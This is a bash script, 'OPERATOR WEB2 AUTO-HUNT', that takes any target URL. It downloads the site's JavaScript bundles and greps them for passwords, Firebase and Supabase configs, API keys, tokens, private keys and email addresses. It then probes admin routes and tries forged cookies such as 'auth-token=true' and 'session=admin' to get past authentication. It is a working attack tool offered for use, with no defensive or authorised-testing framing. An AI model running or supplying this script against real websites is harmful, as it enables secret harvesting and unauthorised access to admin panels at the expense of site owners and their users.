#!/bin/bash
# 🔥 OPERATOR WEB2 AUTO-HUNT v1.0
# Usage: ./web2-hunt.sh https://target.com
# Auto-download JS bundles, scan for admin creds, Firebase/Supabase, auth bypass

TARGET="$1"
OUTDIR="/tmp/web2-hunt-$(echo $TARGET | md5sum | cut -c1-8)"

[ -z "$TARGET" ] && echo "Usage: $0 https://target.com" && exit 1

mkdir -p "$OUTDIR" && cd "$OUTDIR"
echo "🔥 OPERATOR WEB2 HUNT: $TARGET"
echo "================================================"

# ── 1. FINGERPRINT ──
echo -e "\n[1/6] FINGERPRINT..."
curl -sI -A "Mozilla/5.0" --max-time 10 "$TARGET" > headers.txt
grep -iE "x-powered-by|x-nextjs|vary|server|cf-ray|x-vercel" headers.txt
FRAMEWORK=$(grep -i "x-nextjs\|x-vercel\|next" headers.txt)

# ── 2. CRAWL HTML ──
echo -e "\n[2/6] DOWNLOAD HTML + EXTRACT JS..."
curl -sL -A "Mozilla/5.0" --max-time 15 "$TARGET" > index.html
grep -oP 'src="[^"]*\.js[^"]*"' index.html | tr -d '"' | sed 's/^src=//' | sort -u > js_urls.txt
grep -oP '/_next/static/chunks/[^"'"'"' ]+\.js' index.html | sort -u >> js_urls.txt
grep -oP '/_next/static/[^"'"'"' ]+\.js' index.html | sort -u >> js_urls.txt
JS_COUNT=$(wc -l < js_urls.txt)
echo "  Found $JS_COUNT JS files"

# ── 3. DOWNLOAD JS ──
echo -e "\n[3/6] DOWNLOADING JS BUNDLES..."
mkdir -p chunks
DOWNLOADED=0
while IFS= read -r js; do
    [ -z "$js" ] && continue
    fname="chunks/$(echo "$js" | tr '/' '_' | head -c 80).js"
    if echo "$js" | grep -q "^https\?://"; then
        curl -sL --max-time 10 "$js" -o "$fname" 2>/dev/null
    else
        curl -sL --max-time 10 "${TARGET}${js}" -o "$fname" 2>/dev/null
    fi
    [ -s "$fname" ] && DOWNLOADED=$((DOWNLOADED + 1))
done < js_urls.txt
echo "  Downloaded $DOWNLOADED/$JS_COUNT chunks"

# ── 4. SCAN SECRETS ──
echo -e "\n[4/6] SCANNING FOR SECRETS..."
echo "=== PASSWORDS ===" > findings.txt
grep -roP "(password|passwd|pass)[^}]{0,50}" chunks/ 2>/dev/null | grep -iv "placeholder\|type\|require\|error\|incorrect\|please\|enter\|forgot\|reset\|confirm\|match\|invalid\|min\|max\|length\|char\|digit\|uppercase\|lowercase\|special\|polyfill\|r\.password\|\.password" >> findings.txt 2>/dev/null

echo -e "\n=== FIREBASE ===" >> findings.txt
grep -roP "firebaseConfig[^}]{0,300}|apiKey[\"'][^\"']{20,}[\"'][^}]{0,200}|projectId[\"'][^\"']+[\"']|authDomain[\"'][^\"']+[\"']" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== SUPABASE ===" >> findings.txt
grep -roP "supabaseUrl|supabaseKey|eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{50,}" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== API KEYS ===" >> findings.txt
grep -roP "(apiKey|api_key|API_KEY|apikey)[\"']?\s*[:=]\s*[\"'][^\"']{10,}[\"']" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== EMAIL ===" >> findings.txt
grep -roP "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" chunks/ | sort -u >> findings.txt 2>/dev/null

echo -e "\n=== AUTH PATTERNS ===" >> findings.txt
grep -roP "(auth-token|authToken|accessToken|bearerToken|sessionToken|idToken|refreshToken)[^}]{0,100}" chunks/ >> findings.txt 2>/dev/null
grep -roP "document\.cookie[^}]{0,100}" chunks/ >> findings.txt 2>/dev/null
grep -roP "localStorage\.(setItem|getItem)[^}]{0,100}" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== PRIVATE KEY PATTERNS ===" >> findings.txt
grep -roP "(privateKey|private_key|PRIVATE_KEY|secretKey|secret_key|SECRET_KEY)[^}]{0,100}" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== XSS SINKS ===" >> findings.txt
grep -roP "dangerouslySetInnerHTML|innerHTML\s*=|__html|eval\(|document\.write\(" chunks/ >> findings.txt 2>/dev/null

echo -e "\n=== ADMIN ROUTES ===" >> findings.txt
grep -roP "/(admin|dashboard|console|panel|secret|hidden|internal|staff|operator|manage|control)[a-zA-Z0-9_/-]*" chunks/ | sort -u >> findings.txt 2>/dev/null

# ── 5. AUTH BYPASS TEST ──
echo -e "\n[5/6] TESTING AUTH BYPASS..."
for path in "/admin" "/admin/blogs" "/admin/login" "/dashboard" "/console" "/api/admin" "/panel" "/secret" "/wp-admin" "/login" "/auth" "/api/auth/session"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" --max-time 5 "${TARGET}${path}" 2>/dev/null)
    [ "$code" != "000" ] && [ "$code" != "404" ] && echo "  $path → $code" >> auth_test.txt
done

echo -e "\n--- Cookie Forge ---" >> auth_test.txt
for path in "/admin" "/admin/blogs" "/dashboard" "/console"; do
    normal=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
    forged=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: auth-token=true" --max-time 5 "${TARGET}${path}" 2>/dev/null)
    forged2=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: session=admin" --max-time 5 "${TARGET}${path}" 2>/dev/null)
    forged3=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: admin=true" --max-time 5 "${TARGET}${path}" 2>/dev/null)
    [ "$normal" != "$forged" ] && echo "  🔥 $path: $normal → $forged (auth-token=true)" >> auth_test.txt
    [ "$normal" != "$forged2" ] && echo "  🔥 $path: $normal → $forged2 (session=admin)" >> auth_test.txt
    [ "$normal" != "$forged3" ] && echo "  🔥 $path: $normal → $forged3 (admin=true)" >> auth_test.txt
done

# ── 6. REPORT ──
echo -e "\n[6/6] GENERATING REPORT..."
cat > report.txt << EOF
╔══════════════════════════════════════════════════════╗
║  🔥 OPERATOR WEB2 HUNT REPORT                           ║
║  Target: $TARGET                                     ║
║  Date: $(date)                                        ║
║  Output: $OUTDIR                                      ║
╚══════════════════════════════════════════════════════╝

FRAMEWORK: $FRAMEWORK
JS FILES: $DOWNLOADED downloaded

═══════════ FINDINGS ═══════════
$(cat findings.txt)

═══════════ AUTH TEST ═══════════
$(cat auth_test.txt)
EOF

echo ""
echo "✅ DONE! Report: $OUTDIR/report.txt"
echo "   Full findings: $OUTDIR/findings.txt"
echo "   Auth tests: $OUTDIR/auth_test.txt"
echo "   JS chunks: $OUTDIR/chunks/"
echo ""
echo "🔥 KEY FINDINGS:"
grep -E "password|apiKey|firebase|supabase|@.*\.com|dangerouslySetInnerHTML|🔥" findings.txt | head -10
grep "🔥" auth_test.txt | head -5